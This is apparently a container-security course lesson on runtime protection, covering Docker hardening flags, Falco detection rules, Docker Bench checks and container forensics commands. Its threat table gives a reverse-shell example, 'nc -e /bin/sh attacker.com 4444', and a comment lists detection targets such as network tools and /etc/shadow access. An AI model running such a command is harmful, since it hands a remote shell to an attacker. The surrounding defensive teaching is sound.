# Runtime Security

## Unit 9 - Topic 4 | Container Security

---

## Overview

**Runtime security** monitors and protects containers while they are running. Even with secure images and proper isolation, containers can be exploited at runtime through **application vulnerabilities**, **misconfigurations**, and **zero-day attacks**. Runtime security provides the last line of defense.

---

## 1. Runtime Threats

```
┌──────────────────────────────────────────────────────────────┐
│              CONTAINER RUNTIME THREATS                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  THREAT                │ EXAMPLE                              │
│  ──────────────────────┼───────────────────────────────       │
│  Process injection     │ Exec into container, run shell      │
│  Cryptomining          │ Unauthorized CPU/GPU usage           │
│  Reverse shell         │ nc -e /bin/sh attacker.com 4444     │
│  File tampering        │ Modifying binaries at runtime       │
│  Network anomaly       │ Container calling unknown IPs       │
│  Privilege escalation  │ Exploiting capabilities/suid        │
│  Data exfiltration     │ Large outbound data transfers       │
│  Container escape      │ Kernel exploit → host access        │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Docker Runtime Security Options

```bash
# === SECURITY OPTIONS ===

# 1. Read-only filesystem
docker run --read-only \
    --tmpfs /tmp:rw,noexec,nosuid \
    --tmpfs /var/run:rw,noexec,nosuid \
    nginx

# 2. Drop all capabilities
docker run --cap-drop=ALL \
    --cap-add=NET_BIND_SERVICE \
    --cap-add=CHOWN \
    nginx

# 3. No new privileges
docker run --security-opt=no-new-privileges:true nginx

# 4. Custom seccomp profile
docker run --security-opt seccomp=strict-profile.json nginx

# 5. AppArmor profile
docker run --security-opt apparmor=docker-custom nginx

# 6. Resource limits (prevent DoS)
docker run --memory=256m \
    --memory-swap=256m \
    --cpus=0.5 \
    --pids-limit=50 \
    nginx

# 7. Health checks (detect compromised containers)
docker run --health-cmd="curl -f http://localhost/ || exit 1" \
    --health-interval=30s \
    --health-retries=3 \
    nginx

# === COMPLETE SECURE RUN ===
docker run -d \
    --name secure-app \
    --user 1000:1000 \
    --read-only \
    --tmpfs /tmp:rw,noexec,nosuid \
    --cap-drop=ALL \
    --cap-add=NET_BIND_SERVICE \
    --security-opt=no-new-privileges:true \
    --memory=256m \
    --cpus=0.5 \
    --pids-limit=50 \
    --restart=unless-stopped \
    myapp:v1
```

---

## 3. Runtime Monitoring Tools

| Tool | Type | Description |
|------|------|-------------|
| **Falco** | Open source | Syscall-based runtime detection |
| **Sysdig** | Commercial | Container monitoring + forensics |
| **Aqua Security** | Commercial | Full container security platform |
| **Twistlock (Prisma)** | Commercial | Runtime defense + compliance |
| **Docker Bench** | Open source | CIS benchmark checker |

### Falco — Runtime Detection

```bash
# Install Falco
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | sudo apt-key add -
sudo apt install falco

# Falco rules detect:
# • Shell spawned in container
# • Sensitive file access (/etc/shadow)
# • Network tool execution (nmap, nc)
# • Write to system directories
# • Privilege escalation attempts

# Example Falco rules:
# - rule: Terminal shell in container
#   condition: >
#     spawned_process and container and
#     proc.name in (bash, sh, zsh)
#   output: >
#     Shell spawned (user=%user.name container=%container.name
#     shell=%proc.name)
#   priority: WARNING

# Run Falco
sudo falco                            # Monitor in foreground
sudo systemctl start falco            # Run as service
```

---

## 4. Docker Bench for Security

```bash
# Docker Bench — automated CIS benchmark check
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
sudo sh docker-bench-security.sh

# Checks include:
# [PASS] 1.1 - Ensure Docker is updated
# [WARN] 2.1 - Restrict network traffic between containers
# [PASS] 4.1 - Ensure a user for the container has been created
# [WARN] 5.1 - Ensure AppArmor Profile is set
# [PASS] 5.4 - Ensure privileged containers are not used

# Categories:
# 1. Host Configuration
# 2. Docker Daemon Configuration
# 3. Docker Daemon Configuration Files
# 4. Container Images and Build
# 5. Container Runtime
# 6. Docker Security Operations
```

---

## 5. Container Forensics

```bash
# === INVESTIGATE RUNNING CONTAINER ===
# View processes
docker top container_name
docker exec container_name ps aux

# View logs
docker logs container_name
docker logs --since 1h container_name

# View filesystem changes
docker diff container_name
# A = Added, C = Changed, D = Deleted

# === INVESTIGATE STOPPED CONTAINER ===
# Export filesystem for analysis
docker export container_name > container_fs.tar
tar xf container_fs.tar -C /tmp/container_analysis/

# Inspect container metadata
docker inspect container_name

# === PRESERVE EVIDENCE ===
# Commit container state as image
docker commit container_name evidence:case001

# Save image for offline analysis
docker save evidence:case001 > evidence_case001.tar
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Read-only FS** | Prevent runtime file modification |
| **Resource limits** | Prevent DoS from containers |
| **Falco** | Syscall-based runtime anomaly detection |
| **Docker Bench** | CIS compliance checker |
| **Forensics** | `docker diff`, `docker export`, `docker commit` |
| **Health checks** | Detect compromised containers |

---

## Quick Revision Questions

1. **What does `--read-only` do for container security?**
2. **How does Falco detect container threats?**
3. **What does Docker Bench check?**
4. **How do you investigate filesystem changes in a container?**
5. **Write a complete `docker run` command with all security options.**

---

[← Previous: Image Security](03-image-security.md) | [Next: Kubernetes Security Basics →](05-kubernetes-security-basics.md)

---

*Unit 9 - Topic 4 of 5 | [Back to README](../README.md)*
